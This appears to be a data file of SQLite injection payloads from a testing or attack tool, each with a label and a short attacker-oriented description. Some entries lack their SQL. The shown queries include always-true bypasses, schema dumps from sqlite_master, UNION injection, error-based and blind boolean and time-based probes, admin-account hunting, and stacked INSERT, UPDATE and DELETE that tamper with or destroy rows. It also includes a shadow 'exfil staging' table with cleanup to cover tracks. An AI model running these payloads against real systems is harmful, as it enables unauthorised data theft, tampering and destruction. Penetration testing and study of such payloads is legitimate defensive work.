label: Always-true WHERE
what: Every row returned — proves WHERE is injectable

label: Numeric OR bypass
what: OR 1=1 makes condition always true — full table scan

label: Empty string equality
what: Empty = empty is always true — returns all rows

sql: SELECT name,sql FROM sqlite_master WHERE type='table'
label: Schema dump
what: Lists every table + CREATE statement — DB map for attacker

sql: SELECT name,sql FROM sqlite_master WHERE type='index'
label: Index map
what: Reveals all indexes — shows queryable columns

label: Full schema
what: Dumps everything: tables, views, triggers, indexes

sql: SELECT * FROM {TABLE} UNION SELECT name,sql,NULL FROM sqlite_master
label: UNION schema inject
what: Appends schema data to legitimate query result

label: UNION column probe
what: NULL union finds column count without type errors

label: Version fingerprint
what: Exact DB version — helps select targeted exploits

label: Change counter
what: Total rows modified — reveals write activity volume

label: Last rowid leak
what: Most recent auto-increment ID — reveals record scale

sql: SELECT * FROM {TABLE} WHERE id=1 AND 1=CAST('x' AS INTEGER)
label: Type-cast error
what: Forces error — stack trace leaks table/column names

sql: SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END
label: Blind boolean true
what: Returns 1 — baseline for blind boolean extraction

sql: SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END
label: Blind boolean false
what: Returns 0 — confirms boolean branching works

sql: SELECT CASE WHEN (SELECT COUNT(*) FROM {TABLE})>0 THEN 1 ELSE 0 END
label: Row existence blind
what: Returns 1 if table has data — data existence probe

sql: SELECT CASE WHEN (SELECT LENGTH(name) FROM sqlite_master LIMIT 1)>3 THEN 'YES' ELSE 'NO' END
label: Blind length probe
what: Extracts table name length char by char

label: Row injection
what: New record injected — proves stacked INSERT works

label: Data tampering
what: Overwrites first row — proves UPDATE injection works

sql: DELETE FROM {TABLE} WHERE rowid=(SELECT MAX(rowid) FROM {TABLE})
label: Targeted delete
what: Removes last row — confirms stacked DELETE works

sql: CREATE TABLE IF NOT EXISTS attacker_exfil (id INTEGER, data TEXT)
label: Shadow table
what: Creates exfil staging table — attacker persistence setup

label: Cover tracks
what: Drops attacker's table — post-exploit cleanup

sql: SELECT * FROM {TABLE} WHERE name LIKE '%admin%' OR name LIKE '%root%'
label: Admin hunt
what: Finds admin/root accounts — first target post-SQLi

sql: SELECT * FROM {TABLE} ORDER BY rowid DESC LIMIT 5
label: Newest records
what: Gets most recent entries — may include active sessions

label: Column enumeration
what: Zero rows but column metadata leaks — silent schema dump

sql: WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r LIMIT 5000000) SELECT MAX(x) FROM r
label: SQLite time-based blind
what: CPU burn = time delay proves injection without SLEEP()

label: Object count
what: Number of tables+views+triggers — DB complexity fingerprint

label: Trigger extraction
what: Lists triggers — may reveal hidden business logic

label: View extraction
what: Lists views — may expose sensitive computed data

label: Attached DB list
what: All attached databases — full scope of access revealed

label: Column type dump
what: Full column metadata: types, defaults, NOT NULL — schema leak
